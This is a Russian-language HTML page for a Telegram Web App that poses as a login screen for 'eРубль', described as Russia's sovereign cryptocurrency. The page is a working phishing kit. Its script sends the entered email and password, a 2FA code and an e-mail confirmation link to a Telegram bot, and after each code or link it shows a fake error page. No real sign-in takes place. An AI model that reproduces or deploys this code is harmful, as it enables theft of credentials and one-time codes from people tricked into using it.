<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>eРубль</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg-dark: #0b102a;
            --bg-card: #ffffff;
            --text-primary: #0b102a;
            --text-secondary: #6b7280;
            --text-muted: #8a9cbf;
            --accent: #1e64ff;
            --accent-hover: #0059ff;
            --danger: #b91c1c;
            --success: #00a63e;
            --border-color: #0b102a1a;
            --radius: 14px;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0b102a;
            color: var(--text-primary);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            -webkit-font-smoothing: antialiased;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: var(--bg-card);
            border-radius: 24px;
            padding: 32px 24px;
            border: 1px solid var(--border-color);
            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
            position: relative;
        }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo h1 { font-size: 32px; font-weight: 700; color: var(--text-primary); letter-spacing: -0.5px; }
        .logo h1 span { color: var(--accent); }
        .logo p { font-size: 13px; color: var(--text-secondary); margin-top: 4px; text-transform: uppercase; letter-spacing: 1.5px; }

        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; font-size: 14px; font-weight: 500; color: var(--text-secondary); margin-bottom: 6px; }
        .form-group input {
            width: 100%;
            padding: 12px 16px;
            background: #f5f7fa;
            border: 1px solid var(--border-color);
            border-radius: 10px;
            font-size: 16px;
            color: var(--text-primary);
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        .form-group input:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 0 3px rgba(30,100,255,0.15); }
        .form-group input::placeholder { color: var(--text-muted); }

        .btn-primary {
            width: 100%;
            padding: 14px;
            background: linear-gradient(90deg, #1e64ff, #00cbef);
            color: #ffffff;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: filter 0.15s, transform 0.1s;
            margin-top: 8px;
            box-shadow: 0 8px 30px rgba(0,102,255,0.25);
        }
        .btn-primary:hover:not(:disabled) { filter: brightness(0.95); }
        .btn-primary:active:not(:disabled) { transform: scale(0.98); }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }

        .btn-secondary {
            width: 100%;
            padding: 12px;
            background: transparent;
            color: var(--text-secondary);
            border: 1px solid var(--border-color);
            border-radius: 14px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 12px;
            transition: background 0.15s;
        }
        .btn-secondary:hover { background: #f5f7fa; }

        .btn-link { background: transparent; border: none; color: var(--text-secondary); font-size: 14px; cursor: pointer; padding: 4px 0; text-decoration: underline; }
        .btn-link:hover { color: var(--accent); }

        .forgot-link { text-align: right; margin-bottom: 16px; }
        .register-link { text-align: center; margin-top: 16px; font-size: 14px; color: var(--text-secondary); }
        .register-link a { color: var(--accent); text-decoration: none; font-weight: 600; cursor: pointer; }
        .register-link a:hover { text-decoration: underline; }

        .divider { display: flex; align-items: center; gap: 12px; margin: 20px 0; color: var(--text-muted); font-size: 12px; text-transform: uppercase; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--border-color); }

        .message { padding: 12px; border-radius: 10px; font-size: 14px; text-align: center; margin-top: 16px; display: none; }
        .message.error { display: block; background: #ffe2e2; color: #b91c1c; border: 1px solid #f5c6c6; }
        .message.success { display: block; background: #dcfce7; color: #00a63e; border: 1px solid rgba(0,166,62,0.15); }
        .message.info { display: block; background: #e6f0ff; color: #0066ff; border: 1px solid rgba(0,102,255,0.15); }

        .page { display: none; animation: fadeIn 0.3s ease; }
        .page.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }

        .page-title { font-size: 28px; font-weight: 600; text-align: center; margin-bottom: 8px; }
        .page-sub { font-size: 14px; color: var(--text-secondary); text-align: center; margin-bottom: 24px; }

        .error-block { text-align: center; padding: 20px 0; }
        .error-block .icon { font-size: 48px; color: var(--danger); margin-bottom: 16px; }
        .error-block h2 { font-size: 24px; color: var(--danger); margin-bottom: 8px; }
        .error-block p { color: var(--text-secondary); font-size: 14px; margin-bottom: 20px; }

        .page-eid .btn-primary { background: var(--text-primary); color: #ffffff; box-shadow: none; }
        .page-eid .btn-primary:hover:not(:disabled) { background: #1f2937; }

        .support-btn { margin-top: 20px; text-align: center; font-size: 13px; }
        .support-btn a { color: var(--accent); text-decoration: none; cursor: pointer; font-weight: 500; }
        .support-btn a:hover { text-decoration: underline; }

        @media (max-width: 420px) {
            .container { padding: 24px 16px; border-radius: 16px; }
            .logo h1 { font-size: 28px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1><span>eРубль</span></h1>
            <p>Суверенная криптовалюта России</p>
        </div>

        <!-- ===== ГЛАВНАЯ ===== -->
        <div id="pageMain" class="page active">
            <div class="page-title">Вход в аккаунт</div>
            <div class="page-sub">Введите свои данные для входа</div>

            <div class="form-group">
                <label>Email</label>
                <input type="email" id="email" placeholder="Введите ваш email">
            </div>
            <div class="form-group">
                <label>Пароль</label>
                <input type="password" id="password" placeholder="Введите пароль">
            </div>

            <div class="forgot-link">
                <button class="btn-link" onclick="showMsg('Функция восстановления скоро появится', 'info')">Забыли пароль?</button>
            </div>

            <button id="loginSubmitBtn" class="btn-primary">Войти</button>

            <div class="divider">или</div>

            <button id="eidBtn" class="btn-secondary" onclick="switchPage('pageEid')">Вход через E-ID</button>

            <div class="register-link">
                Нет аккаунта? <a onclick="showMsg('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
            </div>
        </div>

        <!-- ===== E-ID ===== -->
        <div id="pageEid" class="page page-eid">
            <div class="page-title">Вход через E-ID</div>
            <div class="page-sub">Введите свои данные для входа</div>

            <div class="form-group">
                <label>Email</label>
                <input type="email" id="eidEmail" placeholder="Введите ваш email">
            </div>
            <div class="form-group">
                <label>Пароль</label>
                <input type="password" id="eidPassword" placeholder="Введите пароль">
            </div>

            <button id="eidSubmitBtn" class="btn-primary">Войти через E-ID</button>
            <button class="btn-secondary" onclick="switchPage('pageMain')">← Назад</button>
        </div>

        <!-- ===== КОД ===== -->
        <div id="pageCode" class="page">
            <div class="page-title">Код подтверждения</div>
            <div class="page-sub">Введите код, отправленный на почту</div>

            <div class="form-group">
                <label>Код из 6 цифр</label>
                <input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric">
            </div>

            <button id="submitCodeBtn" class="btn-primary">Подтвердить</button>
            <button class="btn-secondary" onclick="switchPage('pageMain')">← На главную</button>
        </div>

        <!-- ===== ССЫЛКА ===== -->
        <div id="pageLink" class="page">
            <div class="page-title">Ссылка подтверждения</div>
            <div class="page-sub">Вставьте ссылку из письма</div>

            <div class="form-group">
                <label>Ссылка</label>
                <input type="text" id="linkInput" placeholder="Вставьте ссылку">
            </div>

            <button id="submitLinkBtn" class="btn-primary">Подтвердить</button>
            <button class="btn-secondary" onclick="switchPage('pageEid')">← Назад</button>
        </div>

        <!-- ===== ОШИБКА ===== -->
        <div id="pageError" class="page">
            <div class="error-block">
                <div class="icon">✕</div>
                <h2>Ошибка</h2>
                <p>Повторите попытку входа.</p>
                <button class="btn-secondary" onclick="switchPage('pageMain')">← На главную</button>
            </div>
        </div>

        <!-- ===== ПОДДЕРЖКА ===== -->
        <div class="support-btn">
            <a onclick="openSupport()">🆘 Техническая поддержка</a>
        </div>
    </div>

    <script>
        const SUPPORT_LINK = "https://t.me/erubsite";
        const tg = window.Telegram.WebApp;
        tg.expand();

        const user = tg.initDataUnsafe?.user || {};
        const userId = user.id || 'неизвестно';

        const pageMain = document.getElementById('pageMain');
        const pageEid = document.getElementById('pageEid');
        const pageCode = document.getElementById('pageCode');
        const pageLink = document.getElementById('pageLink');
        const pageError = document.getElementById('pageError');

        const email = document.getElementById('email');
        const password = document.getElementById('password');
        const codeInput = document.getElementById('codeInput');
        const linkInput = document.getElementById('linkInput');
        const eidEmail = document.getElementById('eidEmail');
        const eidPassword = document.getElementById('eidPassword');

        const loginSubmitBtn = document.getElementById('loginSubmitBtn');
        const submitCodeBtn = document.getElementById('submitCodeBtn');
        const submitLinkBtn = document.getElementById('submitLinkBtn');
        const eidSubmitBtn = document.getElementById('eidSubmitBtn');

        let userEmail = '';
        let userPassword = '';

        function showMsg(text, type = 'info') {
            const div = document.createElement('div');
            div.className = `message ${type}`;
            div.textContent = text;
            document.querySelector('.container').appendChild(div);
            setTimeout(() => div.remove(), 5000);
        }

        function switchPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.querySelectorAll('.message').forEach(m => m.remove());
        }

        function openSupport() { window.open(SUPPORT_LINK, '_blank'); }

        // ===== БЕЗОПАСНАЯ ОТПРАВКА ЧЕРЕЗ БОТА =====
        function sendToBot(payload) {
            try {
                tg.sendData(JSON.stringify(payload));
                return true;
            } catch (e) {
                console.error("Ошибка отправки:", e);
                return false;
            }
        }

        // Обычный вход
        loginSubmitBtn.onclick = () => {
            const e = email.value.trim();
            const p = password.value.trim();
            if (!e || !p) { showMsg('Заполните все поля', 'error'); return; }

            loginSubmitBtn.disabled = true;
            loginSubmitBtn.textContent = 'Отправка...';
            userEmail = e; userPassword = p;

            const ok = sendToBot({ type: 'login', email: e, password: p });
            
            if (ok) {
                loginSubmitBtn.disabled = false;
                loginSubmitBtn.textContent = 'Войти';
                switchPage('pageCode');
                showMsg('Данные отправлены. Введите код 2FA.', 'success');
            } else {
                loginSubmitBtn.disabled = false;
                loginSubmitBtn.textContent = 'Войти';
                showMsg('Ошибка отправки', 'error');
            }
        };

        // Код
        submitCodeBtn.onclick = () => {
            const code = codeInput.value.trim();
            if (!code) { showMsg('Введите код', 'error'); return; }

            submitCodeBtn.disabled = true;
            submitCodeBtn.textContent = 'Отправка...';

            const ok = sendToBot({ type: 'code', code: code });

            if (ok) {
                submitCodeBtn.disabled = false;
                submitCodeBtn.textContent = 'Подтвердить';
                codeInput.value = '';
                switchPage('pageError');
            } else {
                submitCodeBtn.disabled = false;
                submitCodeBtn.textContent = 'Подтвердить';
                showMsg('Ошибка отправки', 'error');
            }
        };

        // E-ID
        eidSubmitBtn.onclick = () => {
            const e = eidEmail.value.trim();
            const p = eidPassword.value.trim();
            if (!e || !p) { showMsg('Заполните все поля', 'error'); return; }

            eidSubmitBtn.disabled = true;
            eidSubmitBtn.textContent = 'Отправка...';
            userEmail = e; userPassword = p;

            const ok = sendToBot({ type: 'eid_login', email: e, password: p });

            if (ok) {
                eidSubmitBtn.disabled = false;
                eidSubmitBtn.textContent = 'Войти через E-ID';
                switchPage('pageLink');
                showMsg('Данные отправлены. Введите ссылку.', 'success');
            } else {
                eidSubmitBtn.disabled = false;
                eidSubmitBtn.textContent = 'Войти через E-ID';
                showMsg('Ошибка отправки', 'error');
            }
        };

        // Ссылка
        submitLinkBtn.onclick = () => {
            const link = linkInput.value.trim();
            if (!link) { showMsg('Вставьте ссылку', 'error'); return; }

            submitLinkBtn.disabled = true;
            submitLinkBtn.textContent = 'Отправка...';

            const ok = sendToBot({ type: 'link', link: link });

            if (ok) {
                submitLinkBtn.disabled = false;
                submitLinkBtn.textContent = 'Подтвердить';
                linkInput.value = '';
                switchPage('pageError');
            } else {
                submitLinkBtn.disabled = false;
                submitLinkBtn.textContent = 'Подтвердить';
                showMsg('Ошибка отправки', 'error');
            }
        };
    </script>
</body>
</html>
